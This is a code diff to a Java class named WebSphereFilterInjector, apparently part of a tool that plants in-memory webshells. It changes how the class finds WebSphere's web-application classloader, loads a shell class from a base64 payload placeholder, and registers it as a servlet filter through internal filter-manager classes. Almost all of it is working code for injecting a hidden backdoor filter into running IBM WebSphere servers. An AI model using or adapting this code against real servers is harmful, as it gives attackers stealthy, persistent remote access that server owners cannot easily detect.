@@ -48,7 +48,10 @@ public class WebSphereFilterInjector {
         return "{{base64Str}}";
     }
 
-
+    /**
+     * com.ibm.ws.webcontainer.webapp.WebAppImpl
+     * /opt/IBM/WebSphere/AppServer/plugins/com.ibm.ws.webcontainer.jar
+     */
     public List<Object> getContext() throws Exception {
         List<Object> contexts = new ArrayList<Object>();
         Object context;
@@ -75,12 +78,17 @@ public class WebSphereFilterInjector {
         return contexts;
     }
 
+    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            return ((ClassLoader) getFieldValue(context, "loader"));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
@@ -100,21 +108,10 @@ public class WebSphereFilterInjector {
             return;
         }
 
-        Class<?> filterMappingClass;
-        Class<?> iFilterConfigClass;
-        Class<?> iServletConfigClass;
-        ClassLoader classLoader;
-        try {
-            classLoader = context.getClass().getClassLoader();
-            filterMappingClass = classLoader.loadClass("com.ibm.ws.webcontainer.filter.FilterMapping");
-            iFilterConfigClass = classLoader.loadClass("com.ibm.wsspi.webcontainer.filter.IFilterConfig");
-            iServletConfigClass = classLoader.loadClass("com.ibm.wsspi.webcontainer.servlet.IServletConfig");
-        } catch (Exception e) {
-            classLoader = Thread.currentThread().getContextClassLoader();
-            filterMappingClass = classLoader.loadClass("com.ibm.ws.webcontainer.filter.FilterMapping");
-            iFilterConfigClass = classLoader.loadClass("com.ibm.wsspi.webcontainer.filter.IFilterConfig");
-            iServletConfigClass = classLoader.loadClass("com.ibm.wsspi.webcontainer.servlet.IServletConfig");
-        }
+        ClassLoader classLoader = context.getClass().getClassLoader();
+        Class<?> filterMappingClass = classLoader.loadClass("com.ibm.ws.webcontainer.filter.FilterMapping");
+        Class<?> iFilterConfigClass = classLoader.loadClass("com.ibm.wsspi.webcontainer.filter.IFilterConfig");
+        Class<?> iServletConfigClass = classLoader.loadClass("com.ibm.wsspi.webcontainer.servlet.IServletConfig");
 
         Object filterManager = getFieldValue(context, "filterManager");
         try {
